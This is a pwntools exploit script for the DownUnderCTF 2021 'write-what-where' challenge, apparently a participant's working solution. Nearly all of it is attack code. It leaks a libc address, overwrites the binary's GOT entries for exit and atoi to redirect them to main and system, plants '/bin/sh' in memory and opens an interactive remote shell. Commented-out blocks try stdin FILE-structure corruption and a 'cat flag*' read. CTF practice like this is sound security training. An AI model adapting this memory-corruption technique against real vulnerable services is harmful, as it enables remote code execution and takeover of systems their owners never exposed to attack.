#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwn-2021.duc.tf --port 31920 ./write-what-where
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./write-what-where_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwn-2021.duc.tf'
port = int(args.PORT or 31920)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
b *main
b *0x00000000004011e0
c
c
c
c
c
c
# c
# c
# c
# b *0x40122a
# c
# c
# c
# b *0x401183
# b *0x4011d4
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

libc = exe.libc

bss = 0x404100

p = p64(exe.sym['main'])[:4]
p = p64(0x00000000004011e0)[:4]
io.sendafter("?\n",p)

p = str(exe.got['exit']).ljust(9,"\x00")
io.sendafter("?\n",str(p))

p = 'man'
io.sendline(p)

p = str(0x404058+4).ljust(9,"\x00")
io.sendafter("?\n",str(p))

io.recvline()
leak = u64(io.recvline()[:-1].ljust(8,"\x00"))
print hex(leak)
libc.address = leak - libc.sym['_IO_2_1_stdin_']
print hex(libc.address)
environ = libc.sym['environ']

p = '/bin'
io.send(p)

p = str(bss).ljust(9,"\x00")
io.sendafter("?\n",str(p))

p = '/sh\x00'
io.send(p)

p = str(bss+4).ljust(9,"\x00")
io.sendafter("?\n",str(p))

# p = p64(libc.sym['gets'])[:4]
# # p = p64(libc.address + off[0])[:4]
# io.send(p)

# p = str(exe.got['atoi']).ljust(9,"\x00")
# io.sendafter("?\n",str(p))

p = p64(exe.sym['main'])[:4]
io.send(p)

p = str(exe.got['exit']).ljust(9,"\x00")
io.sendafter("?\n",str(p))

p = p64(libc.sym['system'])[:4]
# p = p64(libc.address + off[0])[:4]
io.send(p)

p = str(exe.got['atoi']).ljust(9,"\x00")
io.sendafter("?\n",str(p))

io.send('aaa\n')

io.send("/bin/sh\x00\n")

# p = p64(libc.sym['gets'])[:4]
# io.sendafter("?\n",p)

# p = str(exe.got['setvbuf']).ljust(9,"\x00")
# io.sendafter("?\n",str(p))

# io.send("\n")

# p = ''
# p+= p64(0xfbad1800) # _flags
# p+= p64(0) # _IO_read_ptr
# p+= p64(environ) # _IO_read_end
# p+= p64(0) # _IO_read_base
# p+= p64(environ) # _IO_write_base
# p+= p64(environ+16) # _IO_write_ptr
# io.sendline(p)

# stack = u64(io.recv(8).ljust(8,"\x00"))-0x220
# print hex(stack)

# p = p64(0x00000000004011e0)[:4]
# io.sendafter("?",p)

# p = str(exe.got['exit']).ljust(9,"\x00")
# io.sendafter("?",str(p))

# _IO_2_1_STDIN_ = libc.sym['_IO_2_1_stdin_']

# p = ''
# p += p64(0xfbad208b) # _flags sama
# p += p64(_IO_2_1_STDIN_) # _IO_read_ptr (needs to be a valid pointer) 
# p += p64(0) * 5 # _IO_read_end - _IO_write_end
# p += p64(stack) # _IO_buf_base
# p += p64(stack + 0x100) # _IO_buf_end, size 0x1000 bytes
# # p = p.ljust(0x4c, b"\x00")
# # p = p.ljust(0x84, b"\x00")
# io.sendline(p)

# io.send("\n")
# io.send("\n")

# p = '/sh'
# io.send(p)

# p = str(bss+4).ljust(9,"\x00")
# io.sendafter("?",str(p))


# pop_3 = 0x00000000004012af
# p = p64(pop_3)[:4]
# io.send(p)

# p = str(exe.got['exit']).ljust(9,"\x00")
# io.sendafter("?\n",str(p))

# sleep(1)
# p = p64(exe.got['exit'])
# p += p64(0xdeadbeef)
# p += p64(0xdeadbeef)
# p += p64(0xdeadbeef)
# io.sendline(p)



# off = [0xde975,0xde979,0xde97c]

# p = p64(libc.sym['system'])[:4]
# # p = p64(libc.address + off[0])[:4]
# io.send(p)

# p = str(exe.got['atoi']).ljust(9,"\x00")
# io.sendafter("?\n",str(p))

# p = p64(0)[:4]
# io.send(p)

# p = str("cat flag*").ljust(9,"\x00")
# # p = str("\x00").ljust(9,"\x00")
# io.sendafter("?\n",str(p))


# p = p64(exe.plt['puts'])[:4]
# io.sendafter("?\n",p)

# p = exe.got['atoi']
# io.sendlineafter("?\n",str(p))

io.interactive()

